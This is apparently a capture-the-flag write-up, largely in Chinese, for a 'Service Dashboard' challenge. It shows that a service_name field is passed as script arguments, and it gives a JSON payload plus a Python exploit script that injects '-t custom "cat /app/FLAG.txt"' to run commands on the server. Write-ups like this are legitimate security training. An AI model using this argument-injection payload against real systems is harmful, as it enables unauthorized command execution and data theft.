# X-068-24 Service Dashboard

> How is the status being verified? Explore with different service names. The goal is to execute commands on the server and read FLAG.txt

打开首页后看到一个服务状态面板（Apache/MySQL/Nginx/SSH）。页面会对 `/check_service` 发起 `POST` 请求，Body 是 JSON：`{"service_name":"apache"}` 等。

给 `/check_service` 发 `POST`，传入 `service_name`，会返回 `{"service_name":..., "status":"true|false"}`。

猜测服务端是调用一个脚本或系统命令检查服务状态。如果把 `service_name` 当作命令行参数拼接给脚本，常见的绕过方式是“伪装成脚本参数”。因此尝试传入类似 `-t custom \"id\"` 这种带选项的参数，看看是否能让脚本按“自定义命令”路径执行。

构造 `service_name` 为脚本参数注入：`-t custom \"命令\"`，如果服务端没有严格限制空格和引号，就可能把整个 `\"命令\"` 当作一个参数传给脚本，脚本再去执行它，从而实现命令注入。

向 `POST /check_service` 发送 JSON：
```json
{"service_name":"-t custom \"cat /app/FLAG.txt\""}
```
返回中 `status` 字段拼接了命令输出，拿到 flag：
![image.png](https://x/x12112712943.png)
## EXP
```python
import requests

url = "http://ip32830/check_service"
json_data = {"service_name": "-t custom \"cat /app/FLAG.txt\""}

r = requests.post(url, json=json_data)
print(r.text)

try:
    print(requests.post(url, json=json_data).json()["status"])  # 直接输出 flag + true
except:
    pass
```